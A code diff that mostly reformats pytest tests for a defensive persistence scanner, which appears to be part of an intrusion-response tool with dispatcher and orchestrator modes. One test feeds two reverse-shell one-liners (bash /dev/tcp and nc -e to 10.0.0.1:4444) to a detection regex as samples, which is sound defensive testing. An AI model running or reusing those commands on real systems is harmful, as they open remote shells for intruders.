@@ -12,8 +12,8 @@ from phantom.response.persistence import (
     _SUSPICIOUS_PATTERNS,
 )
 
-
 # ---------- PersistenceFinding ----------
+
 
 def test_finding_to_dict():
     f = PersistenceFinding(
@@ -51,6 +51,7 @@ def test_scan_result_to_dict():
 
 # ---------- Suspicious patterns ----------
 
+
 def test_suspicious_patterns_detect_reverse_shell():
     assert _SUSPICIOUS_PATTERNS.search("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
     assert _SUSPICIOUS_PATTERNS.search("nc -e /bin/bash 10.0.0.1 4444")
@@ -72,6 +73,7 @@ def test_suspicious_patterns_no_false_positive():
 
 # ---------- PersistenceScanner ----------
 
+
 def test_scan_unknown_pid():
     """Сканирование несуществующего PID возвращает пустой результат."""
     scanner = PersistenceScanner()
@@ -90,13 +92,17 @@ def test_scan_runs_all_categories():
     scanner = PersistenceScanner()
 
     async def _run():
-        with patch.object(scanner, "_resolve_user", return_value=(1000, "testuser")), \
-             patch.object(scanner, "_scan_cron", return_value=[]) as m_cron, \
-             patch.object(scanner, "_scan_ssh_keys", return_value=[]) as m_ssh, \
-             patch.object(scanner, "_scan_systemd_units", return_value=[]) as m_systemd, \
-             patch.object(scanner, "_scan_shell_rc", return_value=[]) as m_rc, \
-             patch.object(scanner, "_scan_at_jobs", return_value=[]) as m_at, \
-             patch.object(scanner, "_scan_active_sessions", return_value=[]) as m_sessions:
+        with (
+            patch.object(scanner, "_resolve_user", return_value=(1000, "testuser")),
+            patch.object(scanner, "_scan_cron", return_value=[]) as m_cron,
+            patch.object(scanner, "_scan_ssh_keys", return_value=[]) as m_ssh,
+            patch.object(scanner, "_scan_systemd_units", return_value=[]) as m_systemd,
+            patch.object(scanner, "_scan_shell_rc", return_value=[]) as m_rc,
+            patch.object(scanner, "_scan_at_jobs", return_value=[]) as m_at,
+            patch.object(
+                scanner, "_scan_active_sessions", return_value=[]
+            ) as m_sessions,
+        ):
 
             result = await scanner.scan(pid=1234)
 
@@ -116,18 +122,24 @@ def test_scan_with_findings():
     """Сканирование с найденными механизмами закрепления."""
     scanner = PersistenceScanner()
     findings = [
-        PersistenceFinding("cron", "high", "/etc/cron.d/evil", "reverse shell", "attacker"),
-        PersistenceFinding("ssh_key", "high", "/home/attacker/.ssh/authorized_keys", "key", "attacker"),
+        PersistenceFinding(
+            "cron", "high", "/etc/cron.d/evil", "reverse shell", "attacker"
+        ),
+        PersistenceFinding(
+            "ssh_key", "high", "/home/attacker/.ssh/authorized_keys", "key", "attacker"
+        ),
     ]
 
     async def _run():
-        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
-             patch.object(scanner, "_scan_cron", return_value=[findings[0]]), \
-             patch.object(scanner, "_scan_ssh_keys", return_value=[findings[1]]), \
-             patch.object(scanner, "_scan_systemd_units", return_value=[]), \
-             patch.object(scanner, "_scan_shell_rc", return_value=[]), \
-             patch.object(scanner, "_scan_at_jobs", return_value=[]), \
-             patch.object(scanner, "_scan_active_sessions", return_value=[]):
+        with (
+            patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")),
+            patch.object(scanner, "_scan_cron", return_value=[findings[0]]),
+            patch.object(scanner, "_scan_ssh_keys", return_value=[findings[1]]),
+            patch.object(scanner, "_scan_systemd_units", return_value=[]),
+            patch.object(scanner, "_scan_shell_rc", return_value=[]),
+            patch.object(scanner, "_scan_at_jobs", return_value=[]),
+            patch.object(scanner, "_scan_active_sessions", return_value=[]),
+        ):
 
             return await scanner.scan(pid=1234)
 
@@ -140,17 +152,21 @@ def test_scan_with_findings():
 def test_scan_with_neutralize():
     """Нейтрализация вызывается при neutralize=True."""
     scanner = PersistenceScanner()
-    finding = PersistenceFinding("cron", "high", "crontab -u attacker", "nc ...", "attacker")
+    finding = PersistenceFinding(
+        "cron", "high", "crontab -u attacker", "nc ...", "attacker"
+    )
 
     async def _run():
-        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
-             patch.object(scanner, "_scan_cron", return_value=[finding]), \
-             patch.object(scanner, "_scan_ssh_keys", return_value=[]), \
-             patch.object(scanner, "_scan_systemd_units", return_value=[]), \
-             patch.object(scanner, "_scan_shell_rc", return_value=[]), \
-             patch.object(scanner, "_scan_at_jobs", return_value=[]), \
-             patch.object(scanner, "_scan_active_sessions", return_value=[]), \
-             patch.object(scanner, "_neutralize", return_value=0) as m_neutralize:
+        with (
+            patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")),
+            patch.object(scanner, "_scan_cron", return_value=[finding]),
+            patch.object(scanner, "_scan_ssh_keys", return_value=[]),
+            patch.object(scanner, "_scan_systemd_units", return_value=[]),
+            patch.object(scanner, "_scan_shell_rc", return_value=[]),
+            patch.object(scanner, "_scan_at_jobs", return_value=[]),
+            patch.object(scanner, "_scan_active_sessions", return_value=[]),
+            patch.object(scanner, "_neutralize", return_value=0) as m_neutralize,
+        ):
 
             await scanner.scan(pid=1234, neutralize=True)
         m_neutralize.assert_called_once()
@@ -175,8 +191,10 @@ def test_kill_user_sessions_calls_kill():
     scanner = PersistenceScanner()
 
     async def _run():
-        with patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")), \
-             patch.object(scanner, "_kill_sessions", return_value=1) as m_kill:
+        with (
+            patch.object(scanner, "_resolve_user", return_value=(1000, "attacker")),
+            patch.object(scanner, "_kill_sessions", return_value=1) as m_kill,
+        ):
             killed = await scanner.kill_user_sessions(pid=1234)
         assert killed == 1
         m_kill.assert_called_once_with("attacker")
@@ -198,6 +216,7 @@ def test_kill_sessions_refuses_empty():
 
 # ---------- Dispatcher integration ----------
 
+
 def test_dispatcher_has_persistence_handlers():
     """Dispatcher содержит обработчики для SCAN_PERSISTENCE и KILL_USER_SESSIONS."""
     from phantom.response.dispatcher import Dispatcher
@@ -212,7 +231,13 @@ def test_dispatcher_scan_persistence_blocked_in_dry_run():
     """SCAN_PERSISTENCE блокируется в dry_run режиме."""
     from phantom.response.dispatcher import Dispatcher
     from phantom.core.state import (
-        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
+        Context,
+        Decision,
+        Event,
+        EventType,
+        ResponseAction,
+        RunMode,
+        Severity,
     )
 
     d = Dispatcher()
@@ -241,7 +266,13 @@ def test_dispatcher_kill_sessions_blocked_in_observation():
     """KILL_USER_SESSIONS блокируется в observation режиме."""
     from phantom.response.dispatcher import Dispatcher
     from phantom.core.state import (
-        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
+        Context,
+        Decision,
+        Event,
+        EventType,
+        ResponseAction,
+        RunMode,
+        Severity,
     )
 
     d = Dispatcher()
@@ -270,7 +301,13 @@ def test_dispatcher_scan_persistence_no_pid():
     """SCAN_PERSISTENCE без PID возвращает ошибку."""
     from phantom.response.dispatcher import Dispatcher
     from phantom.core.state import (
-        Context, Decision, Event, EventType, ResponseAction, RunMode, Severity,
+        Context,
+        Decision,
+        Event,
+        EventType,
+        ResponseAction,
+        RunMode,
+        Severity,
     )
 
     d = Dispatcher()
@@ -296,11 +333,17 @@ def test_dispatcher_scan_persistence_no_pid():
 
 # ---------- Orchestrator integration ----------
 
+
 def test_orchestrator_active_mode_includes_persistence():
     """DecisionEngine в active mode добавляет SCAN_PERSISTENCE и KILL_USER_SESSIONS."""
     from phantom.core.orchestrator import DecisionEngine, OrchestratorConfig
     from phantom.core.state import (
-        Context, Event, EventType, ResponseAction, RunMode, Severity,
+        Context,
+        Event,
+        EventType,
+        ResponseAction,
+        RunMode,
+        Severity,
     )
 
     cfg = OrchestratorConfig(mode=RunMode.ACTIVE)
@@ -329,7 +372,12 @@ def test_orchestrator_observation_mode_no_persistence():
     """DecisionEngine в observation mode не добавляет persistence actions."""
     from phantom.core.orchestrator import DecisionEngine, OrchestratorConfig
     from phantom.core.state import (
-        Context, Event, EventType, ResponseAction, RunMode, Severity,
+        Context,
+        Event,
+        EventType,
+        ResponseAction,
+        RunMode,
+        Severity,
     )
 
     cfg = OrchestratorConfig(mode=RunMode.OBSERVATION)
